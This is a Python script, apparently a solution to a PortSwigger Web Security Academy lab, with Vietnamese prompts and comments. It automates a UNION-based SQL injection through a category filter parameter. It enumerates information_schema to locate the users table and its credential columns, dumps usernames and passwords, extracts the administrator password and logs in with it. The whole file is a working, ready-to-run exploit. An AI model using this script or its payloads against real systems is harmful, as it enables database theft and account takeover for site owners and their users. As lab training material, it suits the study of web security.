#SQL injection attack, listing the database contents on non-Oracle databases
import requests
from bs4 import BeautifulSoup

print("Nhập URL giống như này (pls): https://(your-lab-id).web-security-academy.net/ ")
base_url = input("Nhập URL: ").rstrip("/")

# Tìm tên bảng users_...
payload1 = f"{base_url}/filter?category=Gifts' UNION SELECT table_name,NULL FROM information_schema.tables--"
response = requests.get(payload1)
soup = BeautifulSoup(response.text, "html.parser")
table_name = None
for row in soup.find_all("tr"):
    th = row.find("th")
    if th and th.text.startswith("users_"):
        table_name = th.text.strip()
        break

if not table_name:
    print("Không tìm thấy bảng users </3")
    exit()

# Tìm cột username_... và password_...
payload2 = f"{base_url}/filter?category=Gifts' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='{table_name}'--"
response = requests.get(payload2)
soup = BeautifulSoup(response.text, "html.parser")

username_col = None
password_col = None
for row in soup.find_all("tr"):
    th = row.find("th")
    if th:
        text = th.text.strip()
        if text.startswith("username_"):
            username_col = text
        elif text.startswith("password_"):
            password_col = text
    if username_col and password_col:
        break

if not username_col or not password_col:
    print("Không tìm thấy cột username/password </3")
    exit()

# Trích xuất thông tin tài khoản
payload3 = f"{base_url}/filter?category=Gifts' UNION SELECT {username_col} || ':' || {password_col},NULL FROM {table_name}--"
response = requests.get(payload3)
soup = BeautifulSoup(response.text, "html.parser")

admin_password = None
for row in soup.find_all("tr"):
    th = row.find("th")
    if th:
        text = th.text.strip()
        if text.startswith("administrator:"):
            admin_password = text.split(":", 1)[1]
            break

if not admin_password:
    print("Thua, không tìm thấy mật khẩu administrator </3")
    exit()

print(f"[+] Ngon, mật khẩu administrator là: {admin_password}")

# Đăng nhập
login_url = f"{base_url}/login"
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf,
    "username": "administrator",
    "password": admin_password
}
response = session.post(login_url, data=data)

if (response.status_code == 200):
    print("[+] Ngon, đăng nhập vào được rồi.")
else:
    print("[-] Thua, ca này khó vl bố chịu.")
